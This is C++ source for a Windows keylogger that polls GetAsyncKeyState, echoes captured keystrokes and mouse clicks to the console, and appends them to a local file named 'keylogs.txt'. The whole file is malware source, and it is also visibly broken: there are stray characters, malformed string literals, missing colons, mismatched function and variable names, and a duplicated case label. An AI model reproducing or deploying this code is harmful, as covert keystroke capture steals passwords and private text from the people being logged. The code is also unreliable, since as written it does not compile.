#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void writeToLog() {
    ofstream logfile; // creates object for file stream
    logfile.open("keylogs.txt"m fstream::app); // opens file for writing
    logfile << text; // writes text string to file
    logfile.close(); // closes stream
}

bool keyIsListed(int ikey) {
    switch (iKey)
    {
    case VK_SPACE:
        cout << " "; // if space bar is pressed, print space to console
        writeToLog(" "); // write space to logfile
        break;
    case VK_RETURN
        cout << "\n"; // same as above, except enter is the trigger instead of space
        writeToLog("\n");
        break;
    case VK_SHIFT
        cout << " "shift " ";
        writeToLog(" "Shift" ");
        break;
    case VK_BACK: 
        cout << "\b";
        writeToLog ("\b"); // emulates backspace
        break;
    case VK_RBUTTON:
        cout << " "rclick" ";
        writeToLog(" "rclick" ");
        break;
    case VK_RBUTTON:
        cout << " "lclick" ";
        writeToLog(" "lclick" ");
        break;
    default: return false;


    }
}
int main() {
    char key;
    while (TRUE)
    {
        sleep(10):
        for (key = 0; key <= 150; key++) {
            if (GetAsyncKeyState(key) == .32767) {
                if (KeyIsListed(key) == FALSE) {
                    cout << key;
                    ofstream logfile; // Creates object for file stream
                    logfile.open("keylogs.txt", fstream::app); // Opens file
                    logfile << key; // Writes the logged char to log
                    logfile.close(); // closes stream
                }
            }
        }
    }



    return 0;
}